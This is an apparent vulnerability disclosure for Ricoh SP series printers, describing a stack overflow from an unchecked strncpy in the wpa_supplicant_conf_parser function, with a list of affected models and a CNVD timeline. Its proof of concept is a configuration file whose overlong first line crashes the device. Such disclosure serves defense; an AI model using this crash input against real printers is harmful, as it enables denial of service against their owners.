# Ricoh Printer SP Series Vulnerability

This vulnerability lies in the `wpa_supplicant_conf_parser` function which influences the **most lastest version** of **Ricoh Printer SP Series**. Infected products are listed below:

- SP 320DN
- SP 325DNw
- SP 320SN
- SP 320SFN
- SP 325SNw
- SP 325SFNw
- SP 330SN
- Aficio SP 3500SF
- SP 221S
- SP 220SNw
- SP 221SNw
- SP 221SF
- SP 220SFNw
- SP 221SFNw

## Vulnerability description

In function `wpa_supplicant_conf_parser`, the program opens the file named `/etc/wpa_supplicant.conf` and reads in the content of the file using the function `os_file_get`. The content of the configuration file is stored on a heap variable named `filecontent` on line 48 and line 58 in the picture below. Then it reads in each line of the file content onto the stack using `strncpy` on line 79. However, the code does not check each line's length, which could lead to stack overflow vulnerabilities.

So by controling the content of the configuration file, the attacker can easily perform a **Deny of Service(DoS) Attack** or **Remote Code Execution(RCE)** with carefully crafted overflow data.

![1.png](1.png)

## POC

Any valid configuration file whose first line's length is greater than `0x38` can cause a DoS on this device. Example Configuration file `/etc/wpa_supplicant.conf` is listed below.

```python
# allow frontend (e.g., wpa_cli) to be used by all users in 'wheel' group # This is a looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooong line
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=wheel
#
# home network; allow all valid ciphers
network={
	ssid="home"
	scan_ssid=1
	key_mgmt=WPA-PSK
	psk="very secret passphrase"
}
#
# work network; use EAP-TLS with WPA; allow only CCMP and TKIP ciphers
network={
	ssid="work"
	scan_ssid=1
	key_mgmt=WPA-EAP
	pairwise=CCMP TKIP
	group=CCMP TKIP
	eap=TLS
	identity="user@example.com"
	ca_cert="/etc/cert/ca.pem"
	client_cert="/etc/cert/user.pem"
	private_key="/etc/cert/user.prv"
	private_key_passwd="password"
}
```

## Timeline

- 2021-06-04 report to CVE & CNVD
- 2021-06-17 CNVD ID assigned: CNVD-2021-42364
